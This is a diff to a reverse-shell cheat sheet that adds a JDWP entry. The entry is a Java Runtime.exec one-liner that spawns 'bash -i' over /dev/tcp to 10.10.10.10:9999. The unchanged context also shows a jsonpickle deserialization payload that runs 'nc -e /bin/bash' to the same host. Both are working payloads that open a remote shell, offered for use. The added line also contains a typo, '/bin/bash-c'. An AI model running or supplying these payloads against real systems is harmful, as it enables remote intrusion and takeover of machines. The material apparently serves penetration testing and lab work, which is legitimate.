@@ -23,6 +23,7 @@ Basic reverse shells for any scenario
 - TCLsh
 - Golang
 - jsonpickle 
+- JDWP 
 
 
 # Python
@@ -506,6 +507,10 @@ If netcat is installed
 {"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/bash 10.10.10.10 443"], 0, 0, 0]}
 
 // Replace IP & Port
+```
+# JDWP 
+```
+print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("/bin/bash-c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'").getInputStream())).readLine())
 ```
 
 
